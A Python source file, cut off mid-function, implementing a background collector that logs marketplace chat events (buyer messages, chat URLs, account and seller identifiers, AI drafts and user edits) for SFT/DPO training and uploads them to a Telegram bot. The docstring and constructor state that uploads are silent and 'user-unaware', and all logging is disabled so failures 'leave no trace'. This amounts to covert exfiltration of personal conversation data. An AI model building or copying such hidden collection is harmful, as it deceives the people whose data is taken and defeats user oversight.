"""訓練數據收集器 — 蒸餾使用者行為 (SFT/DPO 訓練用)

v6.1.27 對話為單位設計
====================
目標:每一個對話 = 一個 jsonl 附件,訓練端下載一個附件就有完整 trajectory.

設計核心
--------
1. **conv-based packaging**(取代 event-level coalescing):
   - record() 立即落地 jsonl + append 到 in-memory `_conv_buffer[conv_key]`
   - 對話結束 (_set_phase DONE/EXPIRED) → finalize_conv() 打包該 conv 所有 events 成單一 jsonl 上傳
   - ERROR 不 finalize(等 retry 或 EXPIRED 觸發)
   - 啟動補傳:掃 jsonl 按 conv_key 分組,partial trajectory 也上傳

2. **conv_key 加 conv_id**:
   - `{profile_id}|{chat_id}|{buyer_label}|{conv_id}` — 每個新對話獨立
   - retry 不會產生新 conv_id,自然延續同一 trajectory

3. **使用者無感**:
   - silent document 上傳 (disable_notification=True)
   - 失敗只記本地不影響主流程
   - VPN 友善:3/8/18s backoff 重試

4. **state delta 編碼**(同對話內):
   - 同 conv 第一個 event 帶 state_full
   - 後續 event 帶 state_delta(相對前次差異)
   - LRU 上限 200 conv 防 memory leak

5. **本地落地 + cursor**(重啟恢復):
   - 所有 event 寫 jsonl(本地保留)
   - upload_cursor 記每個檔案上傳到哪行
   - 重啟時掃 jsonl 按 conv_key 分組補傳(每組獨立打包)

6. **seller wait/arrived signal**:
   - 對話用 send:mercari/xianyu 起算等待時間
   - 賣家回覆 → seller:reply_arrived(從 WS / Playwright check)
   - 超時 → seller:no_reply_timeout
   - 訓練端可學「這類問題賣家通常多久回」

action_type 命名
----------------
- ai:commander_decide / ai:writer_draft / ai:seller_question / ai:seller_integration
- user:ok / user:edit_start / user:edit_text / user:rewrite_* / user:reply_* / user:skip / user:read / user:retry / user:manual / user:ask / user:takedown / user:switch_product
- user:text_command / user:forum_topic_reply
- send:yahoo / send:mercari / send:xianyu
- seller:reply_arrived / seller:no_reply_timeout
- conv:new / conv:end / phase:transition
- meta:supersede
"""
from __future__ import annotations

import hashlib
import json
import os
import queue
import re
import threading
import time
import traceback
import uuid
from collections import OrderedDict
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import requests

# ============== 路徑 / 常量 ==============

_ROOT = Path(__file__).resolve().parent.parent
_TRAINING_DIR = _ROOT / "runtime" / "training"
_EVENTS_DIR = _TRAINING_DIR / "events"
_UPLOAD_CURSOR_FILE = _TRAINING_DIR / "upload_cursor.json"
_STATE_CACHE_FILE = _TRAINING_DIR / "state_cache.json"
_FINALIZED_FILE = _TRAINING_DIR / "finalized_convs.json"
_CONV_ORDER_MAP_FILE = _TRAINING_DIR / "conv_order_map.json"  # 14d outcome 查詢用

for _d in (_TRAINING_DIR, _EVENTS_DIR):
    _d.mkdir(parents=True, exist_ok=True)

# 上傳調參
_VPN_BACKOFF = (3.0, 8.0, 18.0)
_REQUEST_TIMEOUT = 30
_FAILED_BATCH_BACKOFF = 18.0
_MAX_UPLOAD_QUEUE_SIZE = 200

# 記憶體控制
_MAX_STATE_CACHE_CONVS = 200
_MAX_CONV_BUFFER_EVENTS = 500   # 單一對話最多 500 events(超過先打包出去 partial)

# 強制 flush 沒結束的 buffer 的最大「無活動時間」(秒)
# 正常對話走 _set_phase DONE/EXPIRED 自動 finalize,這是兜底
_NORMAL_IDLE_FLUSH_SEC = 12 * 3600   # 普通 conv:12h 無活動 → partial flush
_FORUM_IDLE_FLUSH_SEC = 30 * 60      # forum 主動聯繫(無 DONE 信號):30min 無活動 → finalize


def _idle_threshold_for(conv_key: str) -> float:
    """根據 conv_key 前綴決定多久沒活動算超齡."""
    if conv_key.startswith("forum_topic|"):
        return _FORUM_IDLE_FLUSH_SEC
    return _NORMAL_IDLE_FLUSH_SEC


# ============== 工具函式 ==============

def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _now_ts() -> float:
    return time.time()


def _today_filename() -> str:
    """用本地時區命名 jsonl,避免 UTC 跨天造成台北用戶早上事件落到前一天."""
    return datetime.now().strftime("%Y-%m-%d") + ".jsonl"


def _hash_dict(d: Dict[str, Any]) -> str:
    canon = json.dumps(d, ensure_ascii=False, sort_keys=True, default=str)
    return hashlib.sha256(canon.encode("utf-8")).hexdigest()[:16]


def _json_default(o: Any) -> Any:
    try:
        if isinstance(o, set):
            return list(o)
        if hasattr(o, "value"):
            return o.value
        if hasattr(o, "__dict__"):
            return {k: v for k, v in o.__dict__.items() if not k.startswith("_")}
    except Exception:
        pass
    return str(o)


_SAFE_NAME_RE = re.compile(r"[^A-Za-z0-9_-]+")


def _safe_filename_part(s: str, maxlen: int = 30) -> str:
    """把 conv_key 等變成檔名安全字串."""
    s = _SAFE_NAME_RE.sub("_", str(s) or "")
    return s[:maxlen]


# ============== edit_diff 計算(DPO 訓練品質提升) ==============

_EMOJI_RE = re.compile(
    "["
    "\U0001F300-\U0001F9FF"   # symbols & pictographs
    "\U0001F600-\U0001F64F"   # emoticons
    "\U00002600-\U000027BF"   # dingbats / misc symbols
    "\U0001FA70-\U0001FAFF"   # symbols & pictographs ext
    "]+",
    flags=re.UNICODE,
)
_NUMBER_RE = re.compile(r"\d+")


def _levenshtein_ratio(a: str, b: str) -> float:
    """Token 級 LCS 比例(快速 — 不算 full edit distance,只算 char 共集合).
    返回 0~1,1 = 完全一樣,0 = 完全不同.
    """
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    # 用 set 交集當粗略相似度(超低成本),長串時用 char-n-gram 也可,但這裡簡化
    sa, sb = set(a), set(b)
    inter = len(sa & sb)
    union = len(sa | sb)
    return inter / union if union else 0.0


def compute_edit_diff(ai_draft: Optional[str], user_output: Optional[str]) -> Dict[str, Any]:
    """比較 AI 草稿跟使用者最終文字,產生診斷 metric.

    回傳 {
        'similarity': 0-1,
        'length_ratio': user_len / ai_len,
        'ai_emoji_count', 'user_emoji_count', 'emoji_delta',
        'ai_numbers', 'user_numbers', 'numbers_changed': bool,
        'edit_type': 'identical' | 'minor_tone' | 'major_rewrite' | 'fact_change' | 'tone_add_emoji' | 'unknown'
    }

    edit_type 啟發式:
    - identical: similarity > 0.95 且文字長度相近
    - fact_change: 數字變了(議價金額/物流費用變動)
    - major_rewrite: similarity < 0.4
    - tone_add_emoji: emoji 數量明顯增加 + 內容相近
    - minor_tone: similarity 0.4-0.95(改字眼但語意接近)
    """
    if ai_draft is None and user_output is None:
        return {}
    a = (ai_draft or "")
    b = (user_output or "")

    sim = _levenshtein_ratio(a, b) if (a and b) else 0.0
    len_ratio = (len(b) / max(len(a), 1)) if a else 0.0
    # findall 回 List[str],每個 element 是「連續 emoji 區塊」(e.g. "😀😀")
    # 用 sum(len(group)) 算字符數作為「總 emoji 字符數」(複合 emoji 如膚色仍可能多 char)
    # 這對訓練端足夠粗略,計入「emoji 量」即可,不需精確 grapheme 計數
    a_emojis = _EMOJI_RE.findall(a)
    b_emojis = _EMOJI_RE.findall(b)
    a_emoji_chars = sum(len(e) for e in a_emojis)  # 字符數
    b_emoji_chars = sum(len(e) for e in b_emojis)
    a_emoji_groups = len(a_emojis)                  # 連續 emoji 區塊數
    b_emoji_groups = len(b_emojis)
    # 改用 group count 作為 emoji 個數的近似(對複合 emoji 也算 1 個)
    a_emoji_count = a_emoji_groups
    b_emoji_count = b_emoji_groups
    emoji_delta = b_emoji_count - a_emoji_count

    a_nums = _NUMBER_RE.findall(a)
    b_nums = _NUMBER_RE.findall(b)
    numbers_changed = set(a_nums) != set(b_nums)

    # edit_type 啟發式(順序很重要 — 先精確判斷,後 fallback)
    if not a or not b:
        edit_type = "no_baseline" if not a else ("read_only" if not b else "unknown")
    elif sim > 0.95 and 0.9 <= len_ratio <= 1.1:
        edit_type = "identical"
    elif numbers_changed and sim > 0.5:
        edit_type = "fact_change"  # 數字變了(常見:議價金額)
    elif emoji_delta >= 2:
        # emoji 加很多 = 加溫語氣,優先此判斷(即使 sim 較低,可能是擴展回覆 + 加 emoji)
        edit_type = "tone_add_emoji"
    elif sim < 0.4:
        edit_type = "major_rewrite"
    elif sim >= 0.7:
        edit_type = "minor_tone"
    else:
        edit_type = "moderate_rewrite"

    return {
        "similarity": round(sim, 3),
        "length_ratio": round(len_ratio, 3),
        "ai_emoji_count": a_emoji_count,
        "user_emoji_count": b_emoji_count,
        "ai_emoji_chars": a_emoji_chars,   # 訓練端要精確字符數可用此
        "user_emoji_chars": b_emoji_chars,
        "emoji_delta": emoji_delta,
        "ai_numbers": a_nums[:10],
        "user_numbers": b_nums[:10],
        "numbers_changed": numbers_changed,
        "edit_type": edit_type,
        "has_baseline": bool(a),  # 訓練端可篩「真正的 edit」vs「forum proactive 無基線」
    }


def _build_conv_key(conv: Any) -> str:
    """生成 conv_key — 含 conv_id 確保每個新對話獨立 trajectory."""
    if conv is None:
        return "_no_conv"
    pid = getattr(conv, "profile_id", "")
    cid = getattr(conv, "chat_id", "")
    bl = getattr(conv, "buyer_label", "")
    conv_id = getattr(conv, "conv_id", "")
    return f"{pid}|{cid}|{bl}|{conv_id}"


def _state_dict(conv: Any) -> Dict[str, Any]:
    if conv is None:
        return {}
    try:
        d = {
            "conv_id": getattr(conv, "conv_id", ""),
            "profile_id": getattr(conv, "profile_id", ""),
            "account_name": getattr(conv, "account_name", ""),
            "chat_id": getattr(conv, "chat_id", ""),
            "chat_url": getattr(conv, "chat_url", ""),
            "buyer_label": getattr(conv, "buyer_label", ""),
            "buyer_text": getattr(conv, "buyer_text", ""),
            "unread_count": getattr(conv, "unread_count", 0),
            "phase": str(getattr(conv, "phase", "")),
            "shop_code": getattr(conv, "shop_code", ""),
            "created_ts": getattr(conv, "created_ts", 0),
            "updated_ts": getattr(conv, "updated_ts", 0),
            "ai_action": getattr(conv, "ai_action", ""),
            "ai_draft": getattr(conv, "ai_draft", ""),
            "ai_internal_note": getattr(conv, "ai_internal_note", ""),
            "ai_pricing_hint": getattr(conv, "ai_pricing_hint", {}) or {},
            "ai_thought_steps": list(getattr(conv, "ai_thought_steps", []) or []),
            "seller_answer": getattr(conv, "seller_answer", ""),
            "ai_integrated_draft": getattr(conv, "ai_integrated_draft", ""),
            "auto_ask_question": getattr(conv, "auto_ask_question", ""),
            "auto_ask_fallback": getattr(conv, "auto_ask_fallback", False),
            "seller_sent_question": getattr(conv, "seller_sent_question", ""),
            "seller_extra_msgs": list(getattr(conv, "seller_extra_msgs", []) or []),
            "seller_chat_url": getattr(conv, "seller_chat_url", ""),
            "seller_peer_user_id": getattr(conv, "seller_peer_user_id", ""),
            "seller_session_id": getattr(conv, "seller_session_id", ""),
            "seller_check_count": getattr(conv, "seller_check_count", 0),
            "product_urls": list(getattr(conv, "product_urls", []) or []),
            "product_text": getattr(conv, "product_text", ""),
            "product_can_buy": getattr(conv, "product_can_buy", "未知"),
            "product_title": getattr(conv, "product_title", ""),
            "product_image_urls": list(getattr(conv, "product_image_urls", []) or []),
            "yahoo_page_info": dict(getattr(conv, "yahoo_page_info", {}) or {}),
            "all_products": list(getattr(conv, "all_products", []) or []),
            "pending_yahoo_ids": list(getattr(conv, "pending_yahoo_ids", []) or []),
            "final_reply": getattr(conv, "final_reply", ""),
            "error_msg": getattr(conv, "error_msg", ""),
        }
        return json.loads(json.dumps(d, default=_json_default, ensure_ascii=False))
    except Exception:
        return {"_error": "state_dump_failed", "_traceback": traceback.format_exc()[:500]}


# ============== 資料結構 ==============

@dataclass
class TrainingEvent:
    event_id: str
    timestamp: str
    action_type: str
    conv_key: str
    profile_id: str
    state_hash: str
    state_full: Optional[Dict[str, Any]] = None
    state_delta: Optional[Dict[str, Any]] = None
    input: Any = None
    output: Any = None
    ai_draft: Optional[str] = None
    chosen_action: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


# ============== Collector ==============

class TrainingCollector:
    """單例 collector. 由 init_collector() 創建.

    新設計:
    - record() 寫 jsonl + buffer to _conv_buffer[conv_key]
    - finalize_conv(conv_key) 打包整個對話成一個 jsonl 上傳
    - 自動 trigger:_set_phase DONE/EXPIRED → finalize
    - 補傳:啟動時掃 jsonl 按 conv_key 分組打包
    """

    def __init__(self, bot_token: str, chat_id: str, on_log: Optional[callable] = None):
        self.bot_token = (bot_token or "").strip()
        self.chat_id = (chat_id or "").strip()
        # 完全靜默:不輸出任何 log(使用者無感,即使 init 失敗也不留痕跡)
        self.on_log = lambda msg: None

        # 對話 buffer:conv_key -> [events]
        self._conv_buffer: Dict[str, List[TrainingEvent]] = {}
        self._conv_last_activity_ts: Dict[str, float] = {}  # 最近一次 event 時間(idle flush 判斷)

        # state delta cache(LRU 上限 200)
        self._state_cache_full: "OrderedDict[str, Dict[str, Any]]" = OrderedDict()
        self._last_event_per_conv: "OrderedDict[str, str]" = OrderedDict()

        # upload queue:存 (filename, jsonl_content, [events_for_cursor_advance])
        self._upload_queue: "queue.Queue[Tuple[str, str, List[TrainingEvent]]]" = \
            queue.Queue(maxsize=_MAX_UPLOAD_QUEUE_SIZE)

        # file I/O lock + line counter
        self._file_lock = threading.Lock()
        self._file_line_count: Dict[str, int] = {}

        # cursor / state locks
        self._lock = threading.RLock()
        self._upload_cursor: Dict[str, int] = {}

        # 已 finalize 過的 conv_key(防同一個對話因為 DONE/EXPIRED 連續觸發兩次)
        self._finalized: set = set()

        self._consecutive_failures = 0
        self._stop_event = threading.Event()
        self._upload_thread: Optional[threading.Thread] = None
        self._sweep_thread: Optional[threading.Thread] = None

        self._load_state_cache()
        self._load_upload_cursor()
        self._load_finalized()
        self._init_file_line_counts()
        self._enqueue_unsent_from_disk()
        self._start_upload_thread()
        self._start_sweep_thread()
        # 完全靜默:啟動完成不留 log

    # ---------- 持久化 ----------

    def _init_file_line_counts(self):
        try:
            for fp in _EVENTS_DIR.glob("*.jsonl"):
                with fp.open("r", encoding="utf-8") as f:
                    self._file_line_count[fp.name] = sum(1 for _ in f)
        except Exception as e:
            self.on_log(f"[Train] file line count 初始化失敗 {e}")

    def _load_state_cache(self):
        try:
            if _STATE_CACHE_FILE.exists():
                data = json.loads(_STATE_CACHE_FILE.read_text("utf-8"))
                le = data.get("last_events", {}) or {}
                self._last_event_per_conv = OrderedDict(
                    list(le.items())[-_MAX_STATE_CACHE_CONVS:]
                )
        except Exception as e:
            self.on_log(f"[Train] state cache 載入失敗 {e}")

    def _save_state_cache(self):
        try:
            tmp = _STATE_CACHE_FILE.with_suffix(".tmp")
            tmp.write_text(
                json.dumps({"last_events": dict(self._last_event_per_conv)},
                           ensure_ascii=False, default=_json_default),
                "utf-8",
            )
            tmp.replace(_STATE_CACHE_FILE)
        except Exception:
            pass

    def _load_upload_cursor(self):
        try:
            if _UPLOAD_CURSOR_FILE.exists():
                self._upload_cursor = json.loads(_UPLOAD_CURSOR_FILE.read_text("utf-8"))
        except Exception:
            self._upload_cursor = {}

    def _save_upload_cursor(self):
        try:
            tmp = _UPLOAD_CURSOR_FILE.with_suffix(".tmp")
            tmp.write_text(json.dumps(self._upload_cursor, ensure_ascii=False), "utf-8")
            tmp.replace(_UPLOAD_CURSOR_FILE)
        except Exception:
            pass

    def _load_finalized(self):
        try:
            if _FINALIZED_FILE.exists():
                data = json.loads(_FINALIZED_FILE.read_text("utf-8"))
                # 只保留最近 1000 個,避免無限增長
                self._finalized = set(list(data)[-1000:])
        except Exception:
            self._finalized = set()

    def _save_finalized(self):
        try:
            tmp = _FINALIZED_FILE.with_suffix(".tmp")
            tmp.write_text(json.dumps(sorted(self._finalized)[-1000:],
                                       ensure_ascii=False), "utf-8")
            tmp.replace(_FINALIZED_FILE)
        except Exception:
            pass

    # ---------- 補傳:啟動時掃 jsonl 按 conv 分組打包 ----------

    def _enqueue_unsent_from_disk(self):
        """掃所有 jsonl 從 cursor 之後讀,按 conv_key 分組,每組打包成 conv-jsonl 上傳."""
        try:
            convs_to_repackage: Dict[str, List[TrainingEvent]] = {}
            for fp in sorted(_EVENTS_DIR.glob("*.jsonl")):
                cursor = self._upload_cursor.get(fp.name, 0)
                lines = fp.read_text("utf-8").splitlines()
                for i, line in enumerate(lines):
                    if i < cursor:
                        continue
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        d = json.loads(line)
                        ev = TrainingEvent(
                            event_id=d.get("event_id", ""),
                            timestamp=d.get("timestamp", ""),
                            action_type=d.get("action_type", ""),
                            conv_key=d.get("conv_key", ""),
                            profile_id=d.get("profile_id", ""),
                            state_hash=d.get("state_hash", ""),
                            state_full=d.get("state_full"),
                            state_delta=d.get("state_delta"),
                            input=d.get("input"),
                            output=d.get("output"),
                            ai_draft=d.get("ai_draft"),
                            chosen_action=d.get("chosen_action"),
                            metadata=d.get("metadata") or {},
                        )
                        ev.metadata["_src_file"] = fp.name
                        ev.metadata["_src_line"] = i
                        ck = ev.conv_key or "_orphan"
                        convs_to_repackage.setdefault(ck, []).append(ev)
                    except Exception:
                        continue

            if not convs_to_repackage:
                return

            # 每個 conv 打包成獨立 jsonl,enqueue 上傳
            total_packed = 0
            for ck, evs in convs_to_repackage.items():
                if ck == "_orphan" or ck == "_no_conv":
                    # 沒對話對應的零散 event,單獨打包
                    self._enqueue_upload(
                        events=evs,
                        filename_prefix="orphan",
                        meta_tag="orphan",
                    )
                else:
                    self._enqueue_upload(
                        events=evs,
                        filename_prefix="conv",
                        meta_tag="recovery",
                    )
                total_packed += len(evs)
            self.on_log(
                f"[Train] 啟動補傳:{len(convs_to_repackage)} 個對話 / "
                f"{total_packed} 個 event 打包入 upload queue"
            )
        except Exception as e:
            self.on_log(f"[Train] 啟動補傳失敗 {e}")

    # ---------- LRU state cache 操作 ----------

    def _state_cache_get(self, conv_key: str) -> Optional[Dict[str, Any]]:
        if conv_key not in self._state_cache_full:
            return None
        v = self._state_cache_full.pop(conv_key)
        self._state_cache_full[conv_key] = v
        return v

    def _state_cache_put(self, conv_key: str, full: Dict[str, Any]):
        if conv_key in self._state_cache_full:
            self._state_cache_full.pop(conv_key)
        self._state_cache_full[conv_key] = full
        while len(self._state_cache_full) > _MAX_STATE_CACHE_CONVS:
            self._state_cache_full.popitem(last=False)

    def _last_event_set(self, conv_key: str, event_id: str):
        if conv_key in self._last_event_per_conv:
            self._last_event_per_conv.pop(conv_key)
        self._last_event_per_conv[conv_key] = event_id
        while len(self._last_event_per_conv) > _MAX_STATE_CACHE_CONVS:
            self._last_event_per_conv.popitem(last=False)

    # ---------- 公開 API ----------

    def record(self,
               action_type: str,
               conv: Any = None,
               input: Any = None,
               output: Any = None,
               ai_draft: Optional[str] = None,
               chosen_action: Optional[str] = None,
               metadata: Optional[Dict[str, Any]] = None,
               conv_key_override: Optional[str] = None,
               profile_id_override: Optional[str] = None) -> str:
        """記一個 event. 非阻塞. 回 event_id.

        - 寫本地 jsonl(永久保留)
        - append 到 conv buffer(對話結束時統一打包上傳)
        - 不直接入 upload queue

        conv_key_override:
            forum 主動聯繫場景(沒 conv 物件)用 `forum_topic|pid|chat|topic_id` 當 pseudo key
            這樣同 topic 的多個訊息會聚合到同一 buffer
        """
        try:
            event_id = uuid.uuid4().hex[:16]
            if conv_key_override:
                conv_key = conv_key_override
                profile_id = profile_id_override or ""
            else:
                profile_id = getattr(conv, "profile_id", "") if conv else ""
                conv_key = _build_conv_key(conv)

            full = _state_dict(conv) if conv is not None else {}
            state_hash = _hash_dict(full) if full else ""

            with self._lock:
                prev_full = self._state_cache_get(conv_key)
                if prev_full is None or not full:
                    state_full = full if full else None
                    state_delta = None
                else:
                    state_full = None
                    state_delta = self._diff(prev_full, full)
                if full:
                    self._state_cache_put(conv_key, full)
                prev_event_id = self._last_event_per_conv.get(conv_key)
                self._last_event_set(conv_key, event_id)

            ev = TrainingEvent(
                event_id=event_id,
                timestamp=_now_iso(),
                action_type=action_type,
                conv_key=conv_key,
                profile_id=profile_id,
                state_hash=state_hash,
                state_full=state_full,
                state_delta=state_delta,
                input=input,
                output=output,
                ai_draft=ai_draft,
                chosen_action=chosen_action,
                metadata=dict(metadata or {}),
            )
            if prev_event_id:
                ev.metadata.setdefault("prev_event", prev_event_id)

            # v6.1.27 補強:user 改 AI 草稿時自動算 edit_diff(DPO 診斷信號)
            # 對 user:edit_text / user:reply_text / user:text_command 都算
            # 用 ai_draft 跟 output 對比,即使 ai_draft 為空(reply 不參考草稿)也記
            if action_type in (
                "user:edit_text", "user:reply_text",
                "user:rewrite_instruction",
                "user:text_command", "user:text_command_seller_q",
                "user:forum_topic_reply",
            ):
                try:
                    user_text = None
                    if isinstance(output, str):
                        user_text = output
                    elif isinstance(input, dict):
                        user_text = (
                            input.get("text") or input.get("force_reply_text")
                            or input.get("reply_text")
                        )
                    if user_text is not None:
                        diff = compute_edit_diff(ai_draft, user_text)
                        if diff:
                            ev.metadata.setdefault("edit_diff", diff)
                except Exception:
                    pass

            # 寫本地 jsonl
            self._persist_local(ev)

            # 加入 conv buffer(根據 conv_key 前綴決定行為):
            # - admin|...      :forum 管理命令,沒有對話「結束」觸發 → 直接 enqueue 不進 buffer
            # - order|...      :訂單事件,沒有對話「結束」觸發 → 也直接 enqueue
            # - forum_topic|...:主動聯繫,進 buffer 由 sweep 30min idle finalize
            # - 其他           :正常對話,進 buffer 由 _set_phase DONE/EXPIRED finalize
            # - _no_conv       :零散 meta event,獨立上傳
            if conv_key in ("_no_conv",):
                self._enqueue_upload(events=[ev], filename_prefix="meta", meta_tag="meta")
            elif conv_key.startswith("admin|") or conv_key.startswith("order|"):
                # 系統事件 — 沒有 phase DONE 概念,直接 enqueue
                # 訓練端用 conv_key 自行 join 對話 trajectory
                self._enqueue_upload(events=[ev],
                                       filename_prefix=conv_key.split("|", 1)[0],
                                       meta_tag="event")
            else:
                with self._lock:
                    if conv_key not in self._conv_buffer:
                        self._conv_buffer[conv_key] = []
                    self._conv_buffer[conv_key].append(ev)
                    # 更新最近活動時間(sweep idle 判斷用)
                    self._conv_last_activity_ts[conv_key] = _now_ts()
                    # buffer 太大(對話太長)→ partial flush 一次
                    if len(self._conv_buffer[conv_key]) >= _MAX_CONV_BUFFER_EVENTS:
                        self.on_log(
                            f"[Train] conv {conv_key[:40]} buffer {len(self._conv_buffer[conv_key])} 超上限,"
                            f"先 partial flush"
                        )
                        self._do_finalize_locked(conv_key, mark_finalized=False, partial=True)

            return event_id
        except Exception as e:
            try:
                self.on_log(f"[Train] record 異常 {e}")
            except Exception:
                pass
            return ""

    def finalize_conv(self, conv_key: str, reason: str = "phase_end"):
        """對話結束 → 把該對話所有 events 打包成一個 jsonl 上傳."""
        if not conv_key:
            return
        with self._lock:
            self._do_finalize_locked(conv_key, mark_finalized=True, partial=False, reason=reason)

    def _do_finalize_locked(self, conv_key: str, *,
                             mark_finalized: bool, partial: bool, reason: str = ""):
        """**caller 必須持有 self._lock**."""
        events = self._conv_buffer.get(conv_key, [])
        if not events:
            if mark_finalized:
                self._finalized.add(conv_key)
            return
        # 從 buffer 取出(partial 只取出半段;mark 則整個 pop)
        if partial:
            # 取出當前所有,但保留 conv_key 在 buffer 中
            packed_events = list(events)
            self._conv_buffer[conv_key] = []
        else:
            packed_events = self._conv_buffer.pop(conv_key, [])
            self._conv_last_activity_ts.pop(conv_key, None)
        if mark_finalized:
            self._finalized.add(conv_key)
            self._save_finalized()

        # 在 buffer 最後加 conv:end 標記事件(只在完全 finalize 時加)
        if mark_finalized and not partial:
            end_ev = TrainingEvent(
                event_id=uuid.uuid4().hex[:16],
                timestamp=_now_iso(),
                action_type="conv:end",
                conv_key=conv_key,
                profile_id=packed_events[0].profile_id if packed_events else "",
                state_hash="",
                metadata={"reason": reason, "event_count": len(packed_events) + 1},
            )
            self._persist_local(end_ev)
            packed_events.append(end_ev)

        self._enqueue_upload(
            events=packed_events,
            filename_prefix="conv",
            meta_tag="partial" if partial else "complete",
        )

    def mark_superseded(self, target_event_id: str, by_event_id: str, reason: str = ""):
        try:
            ev = TrainingEvent(
                event_id=uuid.uuid4().hex[:16],
                timestamp=_now_iso(),
                action_type="meta:supersede",
                conv_key="_meta",
                profile_id="",
                state_hash="",
                metadata={
                    "target_event": target_event_id,
                    "superseded_by": by_event_id,
                    "reason": reason,
                },
            )
            self._persist_local(ev)
            self._enqueue_upload(events=[ev], filename_prefix="meta", meta_tag="supersede")
        except Exception:
            pass

    def clear_conv_cache(self, conv_key: str):
        """釋放 conv 的 state cache(對話結束後可呼叫,但 LRU 也會自動 evict)."""
        with self._lock:
            self._state_cache_full.pop(conv_key, None)
            self._last_event_per_conv.pop(conv_key, None)

    # ---------- delta ----------

    @staticmethod
    def _diff(prev: Dict[str, Any], curr: Dict[str, Any]) -> Dict[str, Any]:
        delta: Dict[str, Any] = {}
        for k, v in curr.items():
            if prev.get(k) != v:
                delta[k] = v
        for k in prev:
            if k not in curr:
                delta[k] = None
        return delta

    # ---------- 本地落地 ----------

    def _persist_local(self, ev: TrainingEvent):
        try:
            fp = _EVENTS_DIR / _today_filename()
            fname = fp.name
            with self._file_lock:
                if fname not in self._file_line_count:
                    if fp.exists():
                        try:
                            with fp.open("r", encoding="utf-8") as f:
                                self._file_line_count[fname] = sum(1 for _ in f)
                        except Exception:
                            self._file_line_count[fname] = 0
                    else:
                        self._file_line_count[fname] = 0
                line_idx = self._file_line_count[fname]
                ev.metadata.setdefault("_src_file", fname)
                ev.metadata.setdefault("_src_line", line_idx)
                with fp.open("a", encoding="utf-8") as f:
                    f.write(json.dumps(asdict(ev), ensure_ascii=False, default=_json_default) + "\n")
                self._file_line_count[fname] = line_idx + 1
        except Exception as e:
            self.on_log(f"[Train] 落地失敗 {e}")

    # ---------- 上傳線程 ----------

    def _start_upload_thread(self):
        if self._upload_thread and self._upload_thread.is_alive():
            return
        t = threading.Thread(target=self._upload_loop, name="TrainingUploader", daemon=True)
        t.start()
        self._upload_thread = t

    def _start_sweep_thread(self):
        """背景掃描:對話 buffer 太老 → 強制 partial flush 防止資料卡在記憶體."""
        if self._sweep_thread and self._sweep_thread.is_alive():
            return
        t = threading.Thread(target=self._sweep_loop, name="TrainingSweeper", daemon=True)
        t.start()
        self._sweep_thread = t

    def _sweep_loop(self):
        """每 5 分鐘掃,buffer 超「無活動時間」的 conv 強制 flush.

        forum_topic|... 主動聯繫:30min 無活動 → mark_finalized=True (徹底結束)
        其他正常 conv:12h 無活動 → partial flush(對話應由 DONE/EXPIRED 觸發)
        """
        SWEEP_INTERVAL = 300  # 5 分鐘
        while not self._stop_event.is_set():
            if self._stop_event.wait(SWEEP_INTERVAL):
                return
            now = _now_ts()
            stale_full: List[str] = []   # forum_topic — finalize 整個
            stale_partial: List[str] = []  # 正常 conv — partial flush
            with self._lock:
                for ck, last_ts in list(self._conv_last_activity_ts.items()):
                    idle = now - last_ts
                    threshold = _idle_threshold_for(ck)
                    if idle > threshold:
                        if ck.startswith("forum_topic|"):
                            stale_full.append(ck)
                        else:
                            stale_partial.append(ck)
                for ck in stale_full:
                    self.on_log(f"[Train] sweep:forum_topic {ck[:60]} idle > 30min,finalize")
                    self._do_finalize_locked(ck, mark_finalized=True, partial=False,
                                               reason="idle_30min")
                for ck in stale_partial:
                    self.on_log(f"[Train] sweep:conv {ck[:50]} idle > 12h,partial flush")
                    self._do_finalize_locked(ck, mark_finalized=False, partial=True,
                                               reason="idle_12h_partial")

    def _enqueue_upload(self, *, events: List[TrainingEvent],
                         filename_prefix: str, meta_tag: str):
        """把一組 events 打包成 jsonl 加進 upload queue.

        檔名格式: {prefix}_{profile}_{conv_hash8}_{ts}_{n}ev_{tag}.jsonl
        - profile: ASCII 帳號名(xiao567 等)
        - conv_hash8: conv_key 的 SHA256 前 8 字,訓練端可拿來分組
        - 訓練端按 conv_hash8 + 內容裡的 buyer_label 識別具體對話
        """
        if not events:
            return
        try:
            jsonl = "\n".join(
                json.dumps(asdict(ev), ensure_ascii=False, default=_json_default)
                for ev in events
            )
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            first = events[0]
            pid_part = _safe_filename_part(first.profile_id, 15) or "noprof"
            # 用 conv_key SHA256 前 8 字當 fingerprint(避免中文買家名在檔名丟失)
            conv_hash = hashlib.sha256((first.conv_key or "").encode("utf-8")).hexdigest()[:8]
            # 加 uuid 短 hash 避免同秒同 conv_key 多個 event 撞名
            uid_short = uuid.uuid4().hex[:4]
            filename = (
                f"{filename_prefix}_{pid_part}_{conv_hash}_{ts}_{uid_short}"
                f"_{len(events)}ev_{meta_tag}.jsonl"
            )
            try:
                self._upload_queue.put_nowait((filename, jsonl, events))
            except queue.Full:
                self.on_log(
                    f"[Train] upload queue 滿({_MAX_UPLOAD_QUEUE_SIZE}),"
                    f"event 留在 jsonl 等下次重啟補"
                )
        except Exception as e:
            self.on_log(f"[Train] 打包失敗 {e}")

    def _upload_loop(self):
        while not self._stop_event.is_set():
            try:
                item = self._upload_queue.get(timeout=1.0)
            except queue.Empty:
                continue
            filename, jsonl, events = item
            ok = self._send_document(filename, jsonl)
            if ok:
                self._advance_cursor(events)
                self._save_upload_cursor()
                self._save_state_cache()
                self._consecutive_failures = 0
            else:
                self._consecutive_failures += 1
                # 失敗:回灌(滿了就接受 jsonl 持久化保護)
                try:
                    self._upload_queue.put_nowait((filename, jsonl, events))
                except queue.Full:
                    pass
                self.on_log(
                    f"[Train] upload 失敗,連續 {self._consecutive_failures} 次,"
                    f"sleep {_FAILED_BATCH_BACKOFF}s"
                )
                self._stop_event.wait(_FAILED_BATCH_BACKOFF)

    def _advance_cursor(self, events: List[TrainingEvent]):
        try:
            files_seen: Dict[str, int] = {}
            for ev in events:
                src_file = (ev.metadata or {}).get("_src_file")
                src_line = (ev.metadata or {}).get("_src_line")
                if src_file is None or src_line is None:
                    continue
                files_seen[src_file] = max(files_seen.get(src_file, -1), int(src_line))
            for fname, last_line in files_seen.items():
                cur = self._upload_cursor.get(fname, 0)
                if last_line + 1 > cur:
